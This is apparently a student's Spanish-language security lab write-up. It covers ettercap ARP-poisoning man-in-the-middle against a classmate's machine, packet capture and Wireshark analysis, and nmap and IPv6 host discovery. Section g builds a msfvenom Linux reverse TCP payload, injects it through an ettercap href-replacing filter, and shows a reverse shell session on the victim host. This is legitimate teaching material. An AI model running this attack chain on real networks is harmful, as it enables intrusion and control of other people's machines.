# PRACTICA 2 LSI

<details>
  <summary>a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.</summary>

  ```console
  root@debian:/home/lsi# apt install ettercap-text-only
  ```
</details>
<details>
  <summary>b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)</summary>

  Previo a los apartados debemos hacer un MITM a la máquina de nuestro compañero :
  ```console
root@debian:/home/lsi# ettercap -T -q -i ens33 -M arp:remote //10.11.48.183/ //10.11.48.1/

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
 ens33 -> 00:50:56:97:15:21
	  10.11.48.71/255.255.254.0
	  fe80::250:56ff:fe97:1521/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 10.11.48.183 00:50:56:97:EB:AC

 GROUP 2 : 10.11.48.1 DC:08:56:10:84:B9
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help
  ```
Luego en otra terminal hacemos un tcpdump para guardar el trafico
```console
root@debian:/home/lsi# tcpdump -i ens33 -s 65535 -w compa.pcap
tcpdump: listening on ens33, link-type EN10MB (Ethernet), snapshot length 65535 bytes
916 packets captured
919 packets received by filter
0 packets dropped by kernel
```
Este archivo me lo paso a mi máquina real y lo leo desde Wireshark.

  -  Identifique los campos de cabecera de un paquete TCP
```console
     Frame 6: 66 bytes on wire (528 bits), 66 bytes captured (528 bits)
Ethernet II, Src: Alcatel-_10:84:b9 (dc:08:56:10:84:b9), Dst: VMware_97:15:21 (00:50:56:97:15:21)
Internet Protocol Version 4, Src: 10.20.38.93, Dst: 10.11.48.71
Transmission Control Protocol, Src Port: 56904, Dst Port: 22, Seq: 1, Ack: 45, Len: 0
    Source Port: 56904
    Destination Port: 22
    [Stream index: 0]
    [Conversation completeness: Incomplete (12)]
    [TCP Segment Len: 0]
    Sequence Number: 1    (relative sequence number)
    Sequence Number (raw): 2990874455
    [Next Sequence Number: 1    (relative sequence number)]
    Acknowledgment Number: 45    (relative ack number)
    Acknowledgment number (raw): 1338463224
    1000 .... = Header Length: 32 bytes (8)
    Flags: 0x010 (ACK)
    Window: 501
    [Calculated window size: 501]
    [Window size scaling factor: -1 (unknown)]
    Checksum: 0x6622 [unverified]
    [Checksum Status: Unverified]
    Urgent Pointer: 0
    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
    [Timestamps]
    [SEQ/ACK analysis]
```
     
  -  Filtre la captura para obtener el tráfico HTTP
  -  Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)
  -  Visualice la paquetería TCP de una determinada sesión.

      Analyze > Follow > TCP Stream
  
  -  Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.

     Statistics > Protocol Hierarchy
  
  -  Obtenga información del tráfico de las distintas “conversaciones” mantenidas.

     Statistics > Conversations
  
  -  Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.

     Statistics > Endpoints

</details>
<details>
	<summary>c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.</summary>

```console
 root@debian:/home/lsi# nmap -sP 10.11.48.0/23 >> nmap.txt
```
En el archivo .txt podemos ver las direcciones MAC.

</details>

<details>
	<summary>d) Obtenga la relación de las direcciones IPv6 de su segmento.</summary>

 ```console
root@debian:/home/lsi#  ping6 -c2 -I ens33 ff02::1 >> ipv6.txt
root@debian:/home/lsi# ip -6 neigh >> neighbours.txt
 ```
</details>
<details>
	<summary>f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.</summary>

</details>
<details>
	<summary>g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.</summary>

1. Instalar metasploit
```console
  root@debian:/home/lsi# curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```
2. Creamos el playload:
```console
root@debian:/home/lsi# msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.71 LPORT=4444 -f elf > payload.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

```
3. Lo metemos en la victima :
```console
root@debian:/home/lsi# nano ett.filter
root@debian:/home/lsi# etterfilter ett.filter -o ig.ef

etterfilter 0.8.3.1 copyright 2001-2020 Ettercap Development Team


 14 protocol tables loaded:
	DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth 

 13 constants loaded:
	VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP 

 Parsing source file 'ett.filter'  done.

 Unfolding the meta-tree  done.

 Converting labels to real offsets  done.

 Writing output to 'ig.ef'  done.

 -> Script encoded into 6 instructions.


root@debian:/home/lsi# echo 1 > /proc/sys/net/ipv4/ip_forward

root@debian:/home/lsi# ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.48.183/ //10.11.48.1/

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Content filters loaded from ig.ef...
Listening on:
 ens33 -> 00:50:56:97:15:21
	  10.11.48.71/255.255.254.0
	  fe80::250:56ff:fe97:1521/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 10.11.48.183 00:50:56:97:EB:AC

 GROUP 2 : 10.11.48.1 DC:08:56:10:84:B9
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

replaced href.

replaced href.

replaced href.

replaced href.

replaced href.

replaced href.

replaced href.

```
4. Reverse shell en el atacante :
```console
root@debian:/home/lsi# msfconsole
Metasploit tip: View all productivity tips with the tips command
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.3.42-dev-                         ]
+ -- --=[ 2374 exploits - 1230 auxiliary - 414 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.48.71
LHOST => 10.11.48.71
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.48.71:4444 
[*] Sending stage (36 bytes) to 10.11.48.183
ls
[*] Command shell session 1 opened (10.11.48.71:4444 -> 10.11.48.183:44364) at 2023-11-07 16:05:31 +0100

Descargas
Documentos
Escritorio
Imágenes
Música
Plantillas
Público
Vídeos
coreruleset-3.3.0
dict.txt
etter.filter
logsInicio
logssh
ossec-hids-3.7.0
ossec-hids-3.7.0.zip
payload.bin
echo h4ck3d > h4ck3d.txt
cat h4ck3d.txt
h4ck3d
exit
[*] 10.11.48.183 - Command shell session 1 closed.
msf6 exploit(multi/handler) > 

```
	
</details>
<details>
	<summary>h) Haga un MITM en IPv6 y visualice la paquetería.</summary>
</details>




<details>
	<summary>i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).</summary>
</details>
<details>
	<summary>j) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.</summary>
</details>
<details>
	<summary>k) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.</summary>
</details>
